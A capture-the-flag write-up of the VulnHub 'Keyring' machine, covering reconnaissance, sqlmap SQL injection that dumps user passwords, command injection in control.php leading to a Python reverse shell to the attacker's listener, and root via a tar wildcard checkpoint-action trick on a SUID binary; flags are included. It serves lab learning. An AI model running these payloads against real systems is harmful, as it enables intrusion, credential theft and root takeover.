### 1. Initial Reconnaissance

My first step was to identify the target machine's IP address within the local network. I utilized `netdiscover` for this purpose.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ netdiscover
Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
                                                                                                                                                                                                                                                                        4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 222
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.1     cc:     1      
192.168.1.37    08:00:27:5d:0d:3d      1      60  PCS Systemtechnik GmbH
```

From the `netdiscover` output, I identified `192.168.1.37` as a potential target, indicated by the "PCS Systemtechnik GmbH" MAC vendor, which often corresponds to virtual machines.

Next, I performed a comprehensive Nmap scan to enumerate open ports and services on the identified IP address. I used `nmap -sS -sV -sC -Pn --min-rate=1000 --max-retries=2 192.168.1.37 -p-` to conduct a SYN scan, detect service versions, run default scripts, disable host discovery (as `netdiscover` already confirmed it was up), set a minimum packet rate for speed, and scan all 65535 TCP ports.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.37 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 11:28 CDT
Nmap scan report for 192.168.1.37
Host is up (0.00037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: |   2048 8d:eb:fd:0a:76:8a:2a:75:6e:9b:6e:7b:51:c4:28:db (RSA)
|   256 53:31:35:c0:3a:a0:48:2f:3a:79:f5:56:cd:3c:63:ee (ECDSA)
|_  256 8d:7b:d3:c9:15:61:03:b1:b5:f1:d2:ed:2c:01:55:65 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:5D:0D:3D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```

The Nmap scan revealed two open ports:

- **Port 22 (SSH):** Running OpenSSH 7.6p1 on Ubuntu. This indicates a potential entry point if credentials are found.
- **Port 80 (HTTP):** Running Apache httpd 2.4.29 on Ubuntu. The HTTP title was empty, suggesting a custom web application.


### 2. Web Enumeration

Given the open HTTP port, I proceeded with web content enumeration using `gobuster` to discover hidden directories and files. I targeted common PHP, TXT, and BAK extensions.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ gobuster dir -u 192.168.1.37 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.37
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 3254]
/home.php             (Status: 302) [Size: 561] [--> index.php]
/about.php            (Status: 302) [Size: 561] [--> index.php]
/login.php            (Status: 200) [Size: 1466]
/history.php          (Status: 200) [Size: 31]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/control.php          (Status: 302) [Size: 561] [--> index.php]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

The `gobuster` scan revealed several PHP files, notably `/history.php` and `/control.php`, which returned a 200 OK status code and a 302 redirect respectively. The small size of `history.php` (31 bytes) was particularly interesting.

I then used `ffuf` to test for Local File Inclusion (LFI) vulnerabilities on `history.php`, attempting to read `/etc/passwd`. Initially, I observed that the response size remained constant (31 bytes) for most requests, indicating no direct LFI.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ ffuf -u 'http://192.168.1.37/history.php?FUZZ=/etc/passwd'  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 0
# ... (output showing many 31-byte responses) ...
```

However, when I removed the size filter (`-fs 0`) and re-ran `ffuf` with a smaller wordlist and making its requests authenticated by adding the cookie header, I noticed a specific entry for `user` that returned a different size (72 bytes). This suggested that the `user` parameter might be reflecting content.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ ffuf -u 'http://192.168.1.37/history.php?FUZZ=abdou'  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 0 -H "Cookie: PHPSESSID=3ehfe0l64atjl5jsakq20r0gd3"
# ... (truncated output) ...
user                    [Status: 200, Size: 72, Words: 5, Lines: 1, Duration: 4ms]
# ... (truncated output) ...
```

To confirm this, I used `curl` to manually test the `user` parameter with a value like `abdou`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ curl -H "Cookie: PHPSESSID=3ehfe0l64atjl5jsakq20r0gd3" http://192.168.1.37/history.php?user=abdou
Pages visited by user abdou<br><br>home<br><br>home<br><br>about<br><br>
```

The response `Pages visited by user abdou<br><br>home<br><br>home<br><br>about<br><br>` confirmed that the `user` parameter was indeed reflecting data, indicating a potential SQL Injection vulnerability.

### 3. SQL Injection

I saved the HTTP request to a file named `request` for use with `sqlmap`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ echo 'GET /history.php?user=abdou HTTP/1.1
Host: 192.168.1.37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Cookie: PHPSESSID=3ehfe0l64atjl5jsakq20r0gd3
Connection: keep-alive' > request
```

I then used `sqlmap` to automatically detect and exploit the SQL injection vulnerability. I specified the request file, batch mode, level 2, risk 2, and 5 threads for efficiency.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ sqlmap -r request --batch --level=2 --risk=2 --threads=5
# ... (truncated sqlmap output) ...
[11:39:40] [INFO] GET parameter 'user' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y
[11:39:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:39:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:39:40] [INFO] target URL appears to be UNION injectable with 1 columns
[11:39:40] [INFO] GET parameter 'user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 382 HTTP(s) requests:
---
Parameter: user (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=abdou' AND (SELECT 2087 FROM (SELECT(SLEEP(5)))kiLu) AND 'tHpY'='tHpY
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: user=abdou' UNION ALL SELECT CONCAT(0x7171707071,0x5476664e75485355584a53574e64435246495642746d45724d485477796c6d6578794666736c4475,0x717a767a71)-- ----
[11:39:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
# ... (truncated sqlmap output) ...
```

`sqlmap` successfully identified both time-based blind and UNION query SQL injection vulnerabilities, confirming the backend DBMS as MySQL.

Next, I enumerated the databases:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ sqlmap -r request --batch --level=2 --risk=2 --threads=5 --dbs
# ... (truncated sqlmap output) ...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
# ... (truncated sqlmap output) ...
```

The `users` database seemed promising. I then enumerated tables within the `users` database:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ sqlmap -r request --batch --level=2 --risk=2 --threads=5 --tables -D users
# ... (truncated sqlmap output) ...
Database: users
[2 tables]
+---------+
| log     |
| details |
+---------+
# ... (truncated sqlmap output) ...
```

The `details` table was a strong candidate for containing user credentials. Finally, I dumped the data from both `log` and `details` tables in the `users` database.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ sqlmap -r request --batch --level=2 --risk=2 --threads=5 --dump -D users -T log,details
# ... (truncated sqlmap output) ...
Database: users
Table: log
[4 entries]
+--------+---------------------+---------------------------------------+
| name   | date_time           | page_visited                          |
+--------+---------------------+---------------------------------------+
| admin  | 2021-06-10 18:58:32 | https://github.com/cyberbot75/keyring |
| abdou  | 2025-07-19 22:01:14 | home                                  |
| abdou  | 2025-07-19 22:01:18 | home                                  |
| abdou  | 2025-07-19 22:01:39 | about                                 |
+--------+---------------------+---------------------------------------+
[11:42:22] [INFO] table 'users.`log`' dumped to CSV file '/home/zengla/.local/share/sqlmap/output/192.168.1.37/dump/users/log.csv'
[11:42:22] [INFO] fetching columns for table 'details' in database 'users'
[11:42:22] [INFO] fetching entries for table 'details' in database 'users'
Database: users
Table: details
[4 entries]
+--------+-----------------------+
| name   | password              |
+--------+-----------------------+
| abdou  | abdou                 |
| admin  | myadmin#p4szw0r4d     |
| john   | Sup3r$S3cr3t$PasSW0RD |
| test   | test                  |
+--------+-----------------------+
# ... (truncated sqlmap output) ...
```

I successfully extracted the following credentials:

- `abdou:abdou`
- `admin:myadmin#p4szw0r4d`
- `john:Sup3r$S3cr3t$PasSW0RD`
- `test:test`


### 4. Initial Foothold

With the discovered credentials, I attempted to SSH into the target machine using the `john` user, as it had a strong-looking password.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ ssh john@192.168.1.37
The authenticity of host '192.168.1.37 (192.168.1.37)' can't be established.
ED25519 key fingerprint is SHA256:9F8H2qpKYJim3wdRC0XiJaF8aTlTnjZGFW/KgrBtHjc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.37' (ED25519) to the list of known hosts.
john@192.168.1.37: Permission denied (publickey).
```

The SSH login failed due to `Permission denied (publickey)`, indicating that password authentication might be disabled or not the primary method.

Recalling the `log` table entry from `sqlmap` that pointed to a GitHub repository (`https://github.com/cyberbot75/keyring`), I decided to inspect the `control.php` file from that repository.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ curl https://github.com/cyberbot75/keyring/blob/main/html/control.php
# ... (truncated HTML output) ...
<php
session_start();
if(isset($_SESSION['name']))
{
	$servername = "localhost";
	$username = "root";
	$password = "sqluserrootpassw0r4";
	$database = "users";

	$conn = mysqli_connect($servername, $username, $password, $database);
	$name = $_SESSION['name'];
	$date =  date('Y-m-d H:i:s');
	echo "HTTP Parameter Pollution or HPP in short is a vulnerability that occurs<br>due to passing of multiple parameters having same name";
		$sql = "insert into log (name , page_visited , date_time) values ('$name','control','$date')";

		if(mysqli_query($conn,$sql))
			{
			echo "<br><br>";
			echo "Date & Time : ".$date;
			}
		system($_GET['cmdcntr']); //system() function is not safe to use , dont' forget to remove it in production .
}
else
{
	header('Location: index.php');
}
?>
```

Analyzing `control.php`, I found a critical vulnerability: `system($_GET['cmdcntr']);`. This line directly executes system commands passed via the `cmdcntr` GET parameter without proper sanitization, leading to a Command Injection vulnerability.

I attempted to use this vulnerability to obtain a reverse shell. I set up a `netcat` listener on my attacking machine (192.168.1.5) on port 4444.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```

Then, I tried to trigger a Python reverse shell using `curl` with the `cmdcntr` parameter.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ curl 'http://192.168.1.37/control.php?cmdcntr=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22192.168.1.5%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22/bin/bash%22)%27'
curl: (3) bad range in URL position 137:http://192.168.1.37/control.php?cmdcntr=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22192.168.1.5%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22/bin/bash%22)%27
```

The `curl` command failed due to URL parsing issues with the single quotes. However, executing the same URL directly in a web browser successfully triggered the reverse shell.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.37 50472
www-data@keyring:/var/www/html$
```

I obtained a shell as the `www-data` user. I then navigated to the `/home` directory and found the `john` user.

```shellscript
www-data@keyring:/var/www/html$ cd /home
www-data@keyring:/home$ ls
john
www-data@keyring:/home$ su john
Password: Sup3r$S3cr3t$PasSW0RD
```

Using the password `Sup3r$S3cr3t$PasSW0RD` obtained from the SQL injection, I successfully switched to the `john` user.

```shellscript
john@keyring:/home$ ls
compress  user.txt
john@keyring:/home$ cat user.txt
[ Keyring - User Owned ]
----------------------------------------------
Flag : VEhNe0Jhc2hfMXNfRnVuXzM4MzEzNDJ9Cg==
----------------------------------------------
by infosecarticles with <3
```

I retrieved the user flag from `user.txt`. The base64 decoded flag is `THM{Bash_1s_Fun_3831342}`.

### 5. Privilege Escalation

To escalate privileges, I first checked for SUID binaries in `john`'s home directory.

```shellscript
john@keyring:~$ ls -la
total 56
drwxr-x--- 5 john john  4096 Jul 19 22:24 .
drwxr-xr-x 3 root root  4096 Jun  7  2021 ..
lrwxrwxrwx 1 john john     9 Jun 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Jun  7  2021 .bash_logout
-rw-r--r-- 1 john john  3771 Jun  7  2021 .bashrc
drwx------ 2 john john  4096 Jul 19 22:24 .cache
-rwsr-xr-x 1 root root 16784 Jun 20  2021 compress
drwx------ 3 john john  4096 Jul 19 22:23 .gnupg
-rw-r--r-- 1 john john   807 Jun  7  2021 .profile
drwxrwxr-x 2 john john  4096 Jul 19 22:24 .ssh
-rw-rw-r-- 1 john john   192 Jun 20  2021 user.txt
```

I found a SUID binary named `compress` owned by `root`. This is a common privilege escalation vector. I copied the `compress` binary to my Kali machine for analysis.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ scp john@192.168.1.37:/home/john/compress ./compress
100%   16KB   6.1MB/s   00:00
```

I then used `r2` (radare2) to analyze the `compress` binary.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/keyring]
└─$ r2 -d compress
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x7fc07b175440]> aaa
# ... (analysis output) ...
[0x7fc07b175440]> afl
# ... (function list) ...
0x564980e4a189    1     62 main
# ... (function list) ...
[0x7fc07b175440]> pdf @ main
            ; DATA XREF from entry0 @ 0x564980e4a0c1(r)
┌ 62: int main (int argc, char **argv, char **envp);
│           0x564980e4a189      f30f1efa       endbr64
│           0x564980e4a18d      55             push rbp
│           0x564980e4a18e      4889e5         mov rbp, rsp
│           0x564980e4a191      bf00000000     mov edi, 0
│           0x564980e4a196      b800000000     mov eax, 0
│           0x564980e4a19b      e8e0feffff     call sym.imp.setgid     ; int setgid(int gid)
│           0x564980e4a1a0      bf00000000     mov edi, 0
│           0x564980e4a1a5      b800000000     mov eax, 0
│           0x564980e4a1aa      e8e1feffff     call sym.imp.setuid     ; int setuid(int uid)
│           0x564980e4a1af      488d3d4e0e..   lea rdi, str._bin_tar_cf_archive.tar_ ; 0x564980e4b004 ; "/bin/tar cf archive.tar *"
│           0x564980e4a1b6      b800000000     mov eax, 0
│           0x564980e4a1bb      e8b0feffff     call sym.imp.system     ; int system(const char *string)
│           0x564980e4a1c0      b800000000     mov eax, 0
│           0x564980e4a1c5      5d             pop rbp
└           0x564980e4a1c6      c3             ret
```

The `r2` analysis of the `main` function revealed that the `compress` binary executes `/bin/tar cf archive.tar *` using the `system()` function. Crucially, it calls `setgid(0)` and `setuid(0)` before executing the `tar` command, meaning it runs as root. The `*` wildcard in the `tar` command is vulnerable to argument injection.

This is a classic `tar` wildcard vulnerability. I can exploit this by creating files with specific names that `tar` will interpret as command-line arguments. The relevant arguments are `--checkpoint=1` and `--checkpoint-action=exec=evil.sh`.

First, I created two files in `john`'s home directory:

```shellscript
john@keyring:~$ echo "" > ./--checkpoint=1
john@keyring:~$ echo "" > ./--checkpoint-action=exec=evil.sh
```

Next, I created a malicious script named `evil.sh` that would give me a root shell.

```shellscript
john@keyring:~$ vim evil.sh
john@keyring:~$ cat evil.sh
#!/bin/bash
/bin/bash -p
john@keyring:~$ chmod +x evil.sh
```

The `#!/bin/bash` shebang ensures it's executed by bash, and `/bin/bash -p` ensures that the shell retains the SUID privileges (i.e., runs as root).

Before executing `compress`, I needed to ensure that `evil.sh` would be found in the `PATH` when `tar` attempts to execute it. I modified the `PATH` environment variable to include the current directory (`/home/john`).

```shellscript
john@keyring:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
john@keyring:~$ export PATH=/home/john:$PATH
```

Finally, I executed the `compress` binary.

```shellscript
john@keyring:~$ ./compress
/bin/tar: archive.tar: file is the archive; not dumped
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@keyring:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1000(john)
```

Upon executing `compress`, the `tar` command processed the specially crafted files, leading to the execution of `evil.sh` with root privileges. I successfully obtained a root shell.

I then navigated to the `/root` directory to retrieve the final flag.

```shellscript
root@keyring:~# cd /root
root@keyring:/root# ls
root.txt
root@keyring:/root# cat root.txt
[ Keyring - Rooted ]
---------------------------------------------------
Flag : VEhNe0tleXIxbmdfUjAwdDNEXzE4MzEwNTY3fQo=
---------------------------------------------------
by infosecarticles with <3
```

The root flag is `VEhNe0tleXIxbmdfUjAwdDNEXzE4MzEwNTY3fQo=`, which decodes to `THM{Keyr1ng_R00t3D_18310567}`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified target IP and open ports (SSH, HTTP).
2. **Web Enumeration:** Discovered `history.php` and `control.php` via `gobuster`. Identified a reflection vulnerability in `history.php`'s `user` parameter.
3. **SQL Injection:** Exploited SQLi on `history.php` using `sqlmap` to dump database credentials, including `john:Sup3r$S3cr3t$PasSW0RD`.
4. **Initial Foothold:** Discovered Command Injection in `control.php` via GitHub source code review. Used this to get a `www-data` reverse shell. Used `john`'s credentials to `su` to the `john` user.
5. **Privilege Escalation:** Identified a SUID `compress` binary. Analyzed it to find a `tar` wildcard vulnerability. Exploited this by creating `--checkpoint` and `--checkpoint-action` files and modifying `PATH` to execute a root shell.
